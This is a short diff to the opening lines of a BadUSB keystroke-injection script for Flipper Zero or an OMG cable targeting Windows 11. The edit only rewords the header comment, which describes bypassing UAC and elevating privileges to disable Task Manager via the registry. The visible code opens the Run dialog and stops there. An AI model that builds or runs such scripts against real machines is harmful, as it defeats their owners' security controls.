@@ -1,7 +1,7 @@
 REM Author: sasquatchchicken
 REM Version 1.0 (Flipper Ducky / OMG Cable)
 REM Target: windows 11
-REM This badkb script bypasses UAC and elevating privileges on a Windows system to disable Task Manager by modifying the Windows registry
+REM This badkb script attempts bypassing UAC and elevating privileges on a Windows system to disable Task Manager by modifying the Windows registry
 DELAY 1000
 REM Open the Run dialog
 WINDOWS r
